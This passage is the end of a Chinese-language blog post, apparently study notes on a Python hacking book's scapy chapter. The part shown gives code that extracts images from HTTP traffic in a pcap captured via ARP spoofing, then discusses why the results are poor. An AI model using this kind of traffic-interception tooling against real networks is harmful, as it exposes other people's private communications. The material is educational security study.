class="keyword">def</span> <span class="title">write</span>(<span class="params">self, content_name</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i, response <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.responses):</span><br><span class="line">            content, content_type = extract_content(response, content_name)</span><br><span class="line">            <span class="keyword">if</span> content <span class="keyword">and</span> content_type:</span><br><span class="line">                fname = os.path.join(OUTDIR, <span class="string">f&#x27;ex_<span class="subst">&#123;i&#125;</span>.<span class="subst">&#123;content_type&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Writing <span class="subst">&#123;fname&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(fname, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_header</span>(<span class="params">payload</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        header_raw = payload[:payload.index(<span class="string">b&#x27;\r\n\r\n&#x27;</span>)+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        sys.stdout.write(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    header = <span class="built_in">dict</span>(re.findall(<span class="string">r&#x27;(.*?): (.*?)\r\n&#x27;</span>, header_raw.decode()))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Content-Type&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> header:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_content</span>(<span class="params">response, content_name=<span class="string">&#x27;image&#x27;</span></span>):</span></span><br><span class="line">    <span class="comment"># Content-Type: image/jpeg\r\n 下面的注释以这个为栗子</span></span><br><span class="line">    content, content_type = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> content_name <span class="keyword">in</span> response.header[<span class="string">&#x27;Content-Type&#x27;</span>]:</span><br><span class="line">        content_type = response.header[<span class="string">&#x27;Content-Type&#x27;</span>].split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">1</span>] <span class="comment"># 获得图片的后缀 jpeg</span></span><br><span class="line">        content = response.payload[response.payload.index(<span class="string">b&#x27;\r\n\r\n&#x27;</span>)+<span class="number">4</span>: ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Content-Encoding&#x27;</span> <span class="keyword">in</span> response.header:</span><br><span class="line">            <span class="keyword">if</span> response.header[<span class="string">&#x27;Content-Encoding&#x27;</span>] == <span class="string">&#x27;gzip&#x27;</span>:</span><br><span class="line">                content = zlib.decompress(response.payload, zlib.MAX_WBITS | <span class="number">32</span>)</span><br><span class="line">            <span class="keyword">elif</span> response.header[<span class="string">&#x27;Content-Encoding&#x27;</span>] == <span class="string">&#x27;deflate&#x27;</span>:</span><br><span class="line">                content = zlib.decompress(response.payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> content, content_type</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pfile = os.path.join(pwd, <span class="string">&#x27;arper.pcap&#x27;</span>)</span><br><span class="line">    recapper = Recapper(pfile)</span><br><span class="line">    recapper.get_responses()</span><br><span class="line">    recapper.write(<span class="string">&#x27;image&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>get_header</code> 函数：取得 payload 的头部</li>
<li><code>extract_content</code> 函数：取出类型为 image 的分组的后缀名和数据，如果数据部分存在压缩，那么就进行解压缩</li>
<li><code>__init__</code> 方法：将每个 TCP 会话单独取出，并创建一个存放 self.response 的列表</li>
<li><code>get_responses</code> 方法：从每个 TCP 会话中过滤掉端口不是 80 的分组，然后将整个 TCP 会话中带有 TCP 头部的分组整合为一个 payload，并加入到 self.response 列表</li>
<li><code>write</code> 方法：将 self.response 中的 每一个 payload 的数据部分写到一个文件里</li>
</ul>
<p>运行结果并不是很理想：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220619220721.png" /></p>
<p>保存下来的图片大部分都是这样的</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220619220806.png" /></p>
<p>这有多个原因：</p>
<ol type="1">
<li><p>一个 TCP 会话不止存在一个 HTTP 分组，这些分组有的不是图片的分组，有的是，而上述代码中不管三七二十一，将一个 TCP 会话中的所有 HTTP 分组合并</p></li>
<li><p>在 <code>extract_content</code> 中只是读取了 <code>response.payload[response.payload.index(b'\r\n\r\n')+4: ]</code> 内容，如果只有一个 HTTP 分组的话，这确实是数据部分，但是 payload 中有多个分组，因此这就会将其他分组的头部也一并读取，而这些头部无法被识别为图片</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220619221205.png" /></p></li>
<li><p>一张图片太大了，被拆成多个分组，不同分组的到来顺序不同，导致即使将数据部分正确拿到，也无法得到正确的图片。比如，我尝试将上图中的文件拆成多个文件，得到多张图片，其中一张图片如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220619223422.png" /></p></li>
</ol>
<p>书中还介绍了人脸识别，这属于机器学习的类别了，这里不做介绍。</p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AA%83%E5%8F%96-email-%E8%AE%A4%E8%AF%81"><span class="toc-number">1.</span> <span class="toc-text">1. 窃取 Email 认证</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#arp-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"><span class="toc-number">2.</span> <span class="toc-text">2. ARP 缓存投毒</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%84%E7%90%86-pcap-%E6%96%87%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">3. 处理 PCAP 文件</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/06/19/%E7%AC%AC%203%20%E7%AB%A0%20scapy%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E6%8E%8C%E6%8E%A7%E8%80%85/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/06/19/%E7%AC%AC%203%20%E7%AB%A0%20scapy%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E6%8E%8C%E6%8E%A7%E8%80%85/&text=第 3 章 scapy：网络的掌控者"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/06/19/%E7%AC%AC%203%20%E7%AB%A0%20scapy%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E6%8E%8C%E6%8E%A7%E8%80%85/&title=第 3 章 scapy：网络的掌控者"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/06/19/%E7%AC%AC%203%20%E7%AB%A0%20scapy%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E6%8E%8C%E6%8E%A7%E8%80%85/&is_video=false&description=第 3 章 scapy：网络的掌控者"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=第 3 章 scapy：网络的掌控者&body=Check out this article: https://hdfzzf.github.io/2022/06/19/%E7%AC%AC%203%20%E7%AB%A0%20scapy%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E6%8E%8C%E6%8E%A7%E8%80%85/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/06/19/%E7%AC%AC%203%20%E7%AB%A0%20scapy%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E6%8E%8C%E6%8E%A7%E8%80%85/&title=第 3 章 scapy：网络的掌控者"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/06/19/%E7%AC%AC%203%20%E7%AB%A0%20scapy%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E6%8E%8C%E6%8E%A7%E8%80%85/&title=第 3 章 scapy：网络的掌控者"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/06/19/%E7%AC%AC%203%20%E7%AB%A0%20scapy%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E6%8E%8C%E6%8E%A7%E8%80%85/&title=第 3 章 scapy：网络的掌控者"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/06/19/%E7%AC%AC%203%20%E7%AB%A0%20scapy%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E6%8E%8C%E6%8E%A7%E8%80%85/&title=第 3 章 scapy：网络的掌控者"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/06/19/%E7%AC%AC%203%20%E7%AB%A0%20scapy%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E6%8E%8C%E6%8E%A7%E8%80%85/&name=第 3 章 scapy：网络的掌控者&description=&lt;p&gt;个人的知识笔记。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/06/19/%E7%AC%AC%203%20%E7%AB%A0%20scapy%EF%BC%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E6%8E%8C%E6%8E%A7%E8%80%85/&t=第 3 章 scapy：网络的掌控者"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2022
    hdfzzf
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/tags/">标签</a></li><!--
     --><!--
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'cactus-1';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
